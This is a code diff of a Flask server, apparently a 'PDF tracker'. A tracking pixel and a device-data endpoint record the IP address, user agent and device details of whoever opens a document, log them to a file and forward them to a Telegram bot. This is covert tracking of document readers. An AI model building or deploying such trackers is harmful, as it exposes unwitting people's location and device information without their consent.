@@ -1,20 +1,17 @@
-from flask import Flask, request, send_file, jsonify
+from flask import Flask, request, send_file, jsonify, render_template
 from datetime import datetime
 import requests
 import os
 from dotenv import load_dotenv
 
-# .env fayldan o'zgaruvchilarni yuklash
 load_dotenv()
 
 app = Flask(__name__)
 
-# .env orqali token va chat_id o'qish
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
 def send_to_telegram(message: str):
-    """Telegramga xabar yuboradi."""
     if not BOT_TOKEN or not CHAT_ID:
         print("❗ BOT_TOKEN yoki CHAT_ID aniqlanmadi.")
         return
@@ -35,7 +32,6 @@ def send_to_telegram(message: str):
 
 @app.route('/track.png')
 def tracker():
-    """PDF ochilganda ishga tushadigan tracker."""
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent')
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -48,28 +44,21 @@ def tracker():
     )
 
     print(message)
-
-    # Log faylga yozish
     try:
         with open("logs.txt", "a", encoding="utf-8") as log:
             log.write(f"{now} | {ip} | {user_agent}\n")
     except Exception as e:
         print("❗ Log faylga yozishda xatolik:", e)
 
-    # Telegramga yuborish
     send_to_telegram(message)
-
-    # Tracker rasm yuborish
     return send_file("pixel.png", mimetype="image/png")
 
 @app.route('/track_data', methods=['POST'])
 def track_data():
-    """Frontenddan kelgan qurilma ma'lumotlarini qabul qiladi."""
     data = request.get_json()
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    # Ma'lumotlarni formatlash
     message = (
         "📊 *Qurilma ma'lumotlari keldi!*\n"
         f"🕓 Sana: {now}\n"
@@ -98,8 +87,6 @@ def track_data():
     )
 
     print(message)
-
-    # Log faylga yozish
     try:
         with open("logs.txt", "a", encoding="utf-8") as log:
             log.write(
@@ -128,15 +115,13 @@ def track_data():
     except Exception as e:
         print("❗ Log faylga yozishda xatolik:", e)
 
-    # Telegramga yuborish
     send_to_telegram(message)
-
     return jsonify({"status": "success"})
 
 @app.route('/')
 def home():
-    return "✅ PDF Tracker Flask server ishlayapti."
+    return render_template("index.html") if os.path.exists("index.html") else "✅ PDF Tracker Flask server ishlayapti."
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 10000))  # Render uchun moslashuv
+    port = int(os.environ.get("PORT", 10000))
     app.run(host="0.0.0.0", port=port)
